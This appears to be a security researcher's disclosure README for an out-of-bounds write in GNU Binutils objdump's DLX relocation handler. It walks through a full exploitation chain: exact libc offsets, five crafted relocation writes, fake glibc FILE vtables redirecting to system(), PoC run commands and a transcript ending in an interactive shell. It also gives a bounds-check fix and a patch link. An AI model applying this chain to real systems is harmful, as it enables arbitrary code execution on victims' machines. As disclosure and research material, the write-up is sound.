# GNU Binutils objdump — OOB Write → FSOP → Arbitrary Code Execution

**Target:** GNU Binutils (all versions through HEAD) — `objdump`
**Environment:** Debian 13 (Trixie), glibc 2.41, x86_64
**Impact:** Arbitrary code execution
**Vector:** Crafted ELF file processed by `objdump -g`
**ASLR:** Bypassed (deterministic mmap delta)

---

## Acknowledgments
A huge thanks to **bikini** for the shoutout and his fair play regarding this discovery. He is a great guy, I had the pleasure of chatting with him, and he has made some awesome findings of his own. Go check out his work!

---

## Vulnerability

### Root cause — `bfd/elf32-dlx.c`

The `R_DLX_RELOC_26_PCREL` relocation handler (`elf32_dlx_relocate26`) performs a 4-byte read/write at `data + reloc_entry->address` without validating the offset against the section size. Since the function returns `bfd_reloc_ok`, the generic bounds check in `bfd/reloc.c` is bypassed entirely.

```c
// bfd/elf32-dlx.c — elf32_dlx_relocate26()
insn  = bfd_get_32(abfd, data + reloc_entry->address);   // OOB read
vallo = insn & 0x03FFFFFF;
if (vallo & 0x03000000)
    vallo = ~(vallo | 0xFC000000) + 1;                   // sign-extend 26 bits

val   = (sym->section->vma + sym->value) - vallo;
insn  = (insn & 0xFC000000) | (val & 0x03FFFFFF);

bfd_put_32(abfd, insn, data + reloc_entry->address);     // OOB write
return bfd_reloc_ok;                                      // skips bounds check
```

The offset `reloc_entry->address` is read directly from the ELF file and can point arbitrarily beyond the section buffer.

### mmap proximity trick

On x86_64, ELF32 offsets are zero-extended, limiting writes to positive offsets. A `.debug_info` section ≥ 128 KB forces `malloc()` to use `mmap()`, placing the buffer adjacent to libc's data segment:

```
┌──────────────────────────────────────┐  ← same mmap region
│  .debug_info buffer (192 KB)         │  data     = 0x7f...d010
│  ├── fake _IO_wide_data  (+0x1000)   │
│  └── fake _IO_jump_t     (+0x2000)   │
│              ...                     │
│  _IO_2_1_stderr_                     │  stderr   = data + 0x21a4d0
│  _IO_wfile_jumps                     │  wfile    = data + 0x218218
│  system()                            │  system() = data + 0x87100
└──────────────────────────────────────┘
```

The delta `stderr - data = 0x21A4D0` is **constant** across ASLR runs because both regions are allocated by the same mmap during libc loading.

---

## FSOP exploitation chain

### Execution path

```
objdump writes to stderr ("Can't get contents for section...")
  └─► _IO_wfile_overflow(stderr)
      └─► _IO_wdoallocbuf(stderr)
          └─► _IO_WDOALLOCATE(stderr)
              = stderr->_wide_data->_wide_vtable->__doallocate(stderr)
              = fake_vtable[0x68](stderr)
              = system(stderr)
              = system("p;sh")         ← stderr._flags[0:4] = "p;sh"
```

### The 5 OOB writes (PCREL26)

| # |  Target (offset from data) | Effect |
|---|----------------------------|--------|
| 0 |   `0x21A4CF` = stderr − 1  | `_flags[0:3]` = `cmd[0..2]` → start of system() argument |
| 1 | `0x21A4F8` = stderr + 0x28 | `_IO_write_ptr` ≠ 0 → forces flush → overflow            |
| 2 | `0x21A56F` = stderr + 0x9F | `_wide_data[0:3]` → points to fake _IO_wide_data          |
| 3 | `0x21A5A7` = stderr + 0xD7 | `vtable[0:3]` → `_IO_wfile_jumps`                        |
| 4 |   `0x21A4D2` = stderr + 2  | `_flags[3]` = `cmd[3]`, padding cleared → null terminator |

### Fake structures (in section buffer)

```
data + 0x1000 : fake _IO_wide_data
  +0xE0      : _wide_vtable → data + 0x2000

data + 0x2000 : fake _IO_jump_t
  +0x68      : __doallocate → system()
```

### Command constraints

The exploit supports **2 to 4-character commands**. Reloc 0 writes `_flags[0:3]` and reloc 4 writes `_flags[3]` + clears the padding, giving `system()` up to 4 chars before the natural null terminator.

Only the first two bytes are constrained by glibc's `FILE` flag layout:

| Bit | Flag | Constraint | Reason |
|-----|------|------------|--------|
|  1  |  `_IO_UNBUFFERED` | `cmd[0] & 0x02 == 0` | otherwise `_IO_wdoallocbuf` skips `__doallocate` |
|  3  |  `_IO_NO_WRITES`  | `cmd[0] & 0x08 == 0` | otherwise overflow returns WEOF immediately      |
|  13 |  `_IO_IS_FILEBUF` | `cmd[1] & 0x20 != 0` | required to enter the doallocate block           |

`cmd[2]` and `cmd[3]` are **unconstrained**.

| Command | Bytes | Effect |
|---------|-------|--------|
| `"ps"`   | 70 73 | list processes |
| `"p;sh"` | 70 3B 73 68 | spawn interactive shell ← most useful |
| `"p;ls"` | 70 3B 6C 73 | list directory |
| `"p;id"` | 70 3B 69 64 | print uid/gid |

---

## Reproduction

### Prerequisites

```bash
# Build binutils with DLX target support
cd binutils-gdb && mkdir build && cd build
../configure --target=dlx-elf --disable-nls --disable-werror
make -j$(nproc)
```

### Generate payload + run exploit

```bash
# Step 1: Generate the malicious ELF (choose your command)
python3 poc_generate.py --cmd "p;sh" -o exploit.bin

# Step 2: Run the exploit (ASLR on, standalone, no GDB)
python3 poc_ptrace.py --cmd "p;sh"   # interactive shell
python3 poc_ptrace.py --cmd "p;id"   # print uid/gid
python3 poc_ptrace.py                # default: "ps"
```

The exploit automatically retries up to 5 times on ASLR byte-3 mismatches (~12% per attempt), reaching **~99.998% success rate**.

### Expected output

```
[*] libc: /lib/x86_64-linux-gnu/libc.so.6
[*] cmd = 'p;sh'  bytes = ['0x70', '0x3b', '0x73', '0x68']
[*] objdump_base = 0x005e61dfbf5000
[*] fn_addr      = 0x005e61e06cad90  (elf32_dlx_relocate26)
[*] libc_base = 0x0075b1ed86c000
[*] stderr    = 0x0075b1eda524e0
[*] system    = 0x0075b1ed8bf110
[*] actual delta = 0x21a4d0  (expected 0x21a4d0)
[*] reloc0 sym->value <- 0x00f65c20  (cmd[0..2] = 'p;s')
[*] reloc4 sym->value <- 0x016d0000  (cmd[3] = 0x68)
...
[+] system() reached — command executing
$ id                                   ← interactive shell
uid=1000(user) gid=1000(user) groups=1000(user)
[+] Done
```

---

## Suggested fix

Add a bounds check in `elf32_dlx_relocate26()` before accessing the section data:

```c
if (reloc_entry->address + 4 > input_section->size)
    return bfd_reloc_outofrange;
```

---

## Files

| File | Description |
|------|-------------|
| `poc_generate.py`  | Generates the malicious DLX ELF payload (`exploit.bin`) with 5 OOB relocs |
| `poc_ptrace.py`    | Standalone exploit — ptrace-based ASLR bypass, retry loop, no GDB required |
| `exploit.bin`      | Pre-generated payload (default cmd `"p;sh"`) |
---

## Disclosure

This vulnerability was reported to the GNU Binutils maintainers.
Exploit code is provided for authorized security research purposes only.

## Patch 

[https://sourceware.org/git/?p=binutils-gdb.git;a=commit;h=114e3aae2b7e34057c8909301eaf78c15687e8e5
](https://sourceware.org/git/?p=binutils-gdb.git;a=commit;h=114e3aae2b7e34057c8909301eaf78c15687e8e5)
